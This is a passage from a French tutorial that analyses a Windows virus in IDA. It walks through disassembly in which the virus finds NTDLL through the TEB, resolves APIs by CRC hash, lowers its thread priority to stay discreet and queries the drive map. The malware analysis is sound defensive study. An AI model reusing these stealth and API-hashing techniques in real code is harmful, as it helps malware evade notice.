								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401075</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">add</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">esp</span><span class="S4">,</span> <span class="S4">-</span><span class="S2">30h</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401078</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S10">large</span> <span class="S8">fs</span><span class="S4">:</span><span class="S2">18h</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; eax= TEB.Self</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040107E</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">eax</span><span class="S4">+</span><span class="S2">4</span><span class="S4">]</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; eax = TEB.StackBase</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401081</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">sub</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S2">4</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; eax = @ 1er dword de la pile</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401084</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">eax</span><span class="S4">]</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; eax= hNTDLL précédemment placé ici</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401086</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>hNTDLL<span class="S4">],</span> <span class="S8">eax</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401089</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">or</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Vérifie la présence de cette valeur</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040108B</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">jnz</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">short</span> hNTDLLPresent<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040108B</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040108D</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>ArgNTDLL<span class="S4">]</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401090</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>hNTDLL<span class="S4">],</span> <span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Sinon, sauvegarde l'argument (qui doit être hNTDLL)</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401093</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401093</span> hNTDLLPresent<span class="S4">:</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; CODE XREF: Thread+19</span><br />
								</span>								
								</div>
								<p>Le 1<sup>er</sup> DWORD de la pile est récupéré par l'intermédiaire du <acronym title="Thread Environment Block">TEB</acronym>. Cette valeur est ensuite sauvegardée dans une variable locale. Finalement, si cette valeur est nulle, l'argument passé à la fonction est placé dans cette variable locale.</p>						
								<p class="Warning"><img src="Images/Warning.png" alt="Warning" />On a vu précédemment que le programme y plaçait l'ImageBase de NTDLL. Mais l'adresse pointée par <span class="S4">[</span><span class="S8">esp</span><span class="S4">+</span><span class="S2">38h</span><span class="S4">]</span> ne correspond au 1<sup>er</sup> DWORD de la pile que sous système <acronym title="2000, XP">NT</acronym>. En effet, sous système <acronym title="95, 98, Me">9x</acronym>, la pile est déjà bien remplie avant d'arriver à l'EntryPoint du programme. De plus, cette valeur étant nulle, c'est l'argument qui sera utilisé à la place. Mais on a vu que lors de la première exécution, l'argument est nul. Donc sous systèmes <acronym title="95, 98, Me">9x</acronym>, le programme crashera lorsqu'il voudra utiliser l'ImageBase de NTDLL.</p>
								<p>Nous avons ensuite un appel à l'api native <b>NTDLL.ZwSetInformationThread</b> :</p>
								<div class="border" id="border">
								<span><span class="S10">.text</span><span class="S4">:</span><span class="S2">00401093</span> hNTDLLPresent<span class="S4">:</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; CODE XREF: Thread+19</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401093</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">cld</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">00401094</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>lpPath<span class="S4">],</span> <span class="S12">':C'</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040109B</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S10">byte</span> <span class="S9">ptr</span> <span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>lpPath<span class="S4">+</span><span class="S2">2</span><span class="S4">],</span> <span class="S2">0</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">0040109F</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S4">-</span><span class="S2">1</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Delta BasePriority</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010A1</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S8">esp</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010A3</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">4</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ThreadInformationLength</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010A5</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ThreadInformation (-1)</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010A6</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">3</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ThreadInformationClass = ThreadBasePriority</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010A8</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0FFFFFFFEh</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ThreadHandle</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010AA</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>hNTDLL<span class="S4">]</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Dll</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010AD</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0C8277BF4h</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ZwSetInformationThread</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010B2</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;GetApiFromCRC<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010B2</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010B7</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span><br />
								</span>						
								</div>
								<p>Le paramètre <b>ThreadInformationClass </b> nous indique que la fonction va modifier la priorité d'exécution du Thread (<i>3 = ThreadBasePriority</i>) et le paramètre <b>ThreadInformation</b> indique que la priorité sera décrémentée. Ceci toujours dans l'optique de rester discret.</p>
								<p>Juste après, nous avons droit à un appel d'une autre api native <b>NTDLL.ZwQueryInformationProcess</b> :</p>
								<div class="border" id="border">
								<span><span class="S10">.text</span><span class="S4">:</span><span class="S2">004010B9</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">pop</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Rétablie la pile (Push -1 en 40109F)</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010BA</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ReturnLength</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010BC</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">24h</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ProcessInformationLength</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010BE</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">lea</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>DeviceMapInfo<span class="S4">]</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010C1</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ProcessInformation</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010C2</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">17h</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ProcessInformationClass = ProcessDeviceMap</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010C4</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">0FFFFFFFFh</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ProcessHandle</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010C6</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>hNTDLL<span class="S4">]</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Dll</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010C9</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">5E7088EDh</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ZwQueryInformationProcess</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010CE</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;GetApiFromCRC<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010CE</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010D3</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span><br />
								</span>						
								</div>
								<p>Le paramètre <b>ProcessInformationClass</b> indique que la fonction demande la liste des lecteurs accessibles par le processus (<i>17h = ProcessDeviceMap</i>). Cela signifie que la fonction va remplir une structure de type <b>PROCESS_DEVICEMAP_INFORMATION</b> dont l'adresse est indiquée dans le paramètre <b>ProcessInformation</b>.</p>
								<p class="Warning"><img src="Images/Warning.png" alt="Warning" />Ces 2 fonctions ne sont pas exportées par <b>ntdll.dll</b> sous 98. Donc même si le programme disposait du Handle de NTDLL, les fonctions ne pourraient pas être importées et le virus provoquerait une exception en appelant l'adresse 0.</p>								
								<p>Cette structure est déclarée en tant que variable locale. Nous allons donc préciser à IDA de quelle structure il s'agit. Sa définition peut être trouvée dans le livre <b>Windows NT/2000 Native API Reference</b> par Gary Nebbett : </p>
								<div class="border" id="border">
								<span><span class="S5">typedef</span><span class="S0"> </span><span class="S5">struct</span><span class="S0"> </span>_PROCESS_DEVICEMAP_INFORMATION<span class="S0"> </span><span class="S10">{</span><span class="S0"> </span><span class="S2">// Information Class 23</span><br />
								<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">union</span><span class="S0"> </span><span class="S10">{</span><br />
								<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">struct</span><span class="S0"> </span><span class="S10">{</span><br />
								<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>HANDLE<span class="S0"> </span>DirectoryHandle<span class="S10">;</span><br />
								<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S10">}</span><span class="S0"> </span>Set<span class="S10">;</span><br />
								<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">struct</span><span class="S0"> </span><span class="S10">{</span><br />
								<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>ULONG<span class="S0"> </span>DriveMap<span class="S10">;</span><br />
								<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>UCHAR<span class="S0"> </span>DriveType<span class="S10">[</span><span class="S4">32</span><span class="S10">];</span><br />
								<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S10">}</span><span class="S0"> </span>Query<span class="S10">;</span><br />
								<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S10">};</span><br />
								<span class="S10">}</span><span class="S0"> </span>PROCESS_DEVICEMAP_INFORMATION<span class="S10">,</span><span class="S0"> </span><span class="S10">*</span>PPROCESS_DEVICEMAP_INFORMATION<span class="S10">;</span><span class="S0">&nbsp; &nbsp; &nbsp; &nbsp;</span></span>
								</div>							
								<p>Nous allons juste déclarer la partie Query puisque c'est la seule qui nous intéresse.</p>							
								<p class="Ida"><img src="Images/Ida.png" alt="Ida" />
								On ouvre la fenêtre des structures (<i>Alt+F9</i>) puis <i>Inser</i> pour créer une nouvelle structure. Il semble que cette structure ne soit pas définie de base dans IDA. Nous allons donc la créer de toute pièce.<br />
								On nomme notre structure <b>PROCESS_DEVICEMAP_INFORMATION</b> puis OK. On obtient ceci :<br /><br />
								0000 <b>PROCESS_DEVICEMAP_INFORMATION struc</b> ; (sizeof=0x0)<br />
								0000 <b>PROCESS_DEVICEMAP_INFORMATION ends</b><br /><br />
								Le 1<sup>er</sup> membre est un dword. Pour le créer, il suffit de taper 3 fois sur la touche <b>D</b> (<i>DB -> DW -> DD</i>). Ensuite on le nomme en <b>DriveMap</b>.<br />
								Le 2<sup>ème</sup> membre est un tableau de 32 octets. On crée d'abord un octet avec la touche <b>D</b> puis le tableau avec la touche <b>*</b>. On précise 32 dans le champ <b>Array Size</b> puis OK. Et finalement on renomme le membre <b>DriveType</b>.<br />
								<br />
 								0000 <b>PROCESS_DEVICEMAP_INFORMATION struc</b> ; (sizeof=0x24)<br />
								0000 <b>DriveMap        dd ?</b><br />
								0004 <b>DriveType       db 32 dup(?)</b><br />
								0024 <b>PROCESS_DEVICEMAP_INFORMATION ends</b><br />
								<br />
								On retourne dans la fonction <b>Thread</b>, on affiche la fenêtre des variables locales (<i>Ctrl+K</i>), on clique sur la première qui doit être <b>var_30</b> et on la définit en tant que structure (<i>Alt+Q</i>). On renomme également la variable en <b>DeviceMapInfo</b> par exemple.
								</p>
